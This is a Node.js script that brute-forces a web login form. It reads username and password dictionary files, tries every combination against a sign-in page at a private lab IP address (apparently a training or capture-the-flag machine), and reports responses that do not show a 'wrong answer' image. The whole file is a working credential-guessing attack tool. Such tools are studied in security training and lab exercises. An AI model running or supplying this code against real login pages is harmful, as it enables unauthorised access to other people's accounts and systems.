const cs = require('cloudscraper')
const $ = require('cheerio')
const passwords = require('./password.dict')
const usernames = require('./username.dict')

const postCredentials = (username, password) => (
  new Promise((resolve, reject) => {
    return cs.post(`http://172.16.158.129/?page=signin&username=${username}&password=${password}&Login=Login#`, { username, password }, (err, res, body) => {
      console.log(`... attempting username: ${username} and password: ${password}`)
      if ($('.container img', body).attr('src') !== 'images/WrongAnswer.gif') {
        console.log($('h2', body).text())
      }
      resolve(body)
    })
  })
)

const bruteforce = async () => {
  const combinations = []
  passwords.forEach((password) => {
    usernames.forEach((username) => {
      combinations.push({ password, username })
    })
  })
  let i = 0
  const response = []
  do {
    const data = await postCredentials(combinations[i].username, combinations[i].password)
    response.push(data)
    i += 1
  } while (i < combinations.length)
  return response
}

console.log('Bruteforce has started')
bruteforce()
  .then((res) => {
    res.forEach((el) => { console.log(el) })
    console.log('Bruteforce succeed')
    process.exit()
  })
  .catch((err) => {
    console.error(err)
    process.exit()
  })

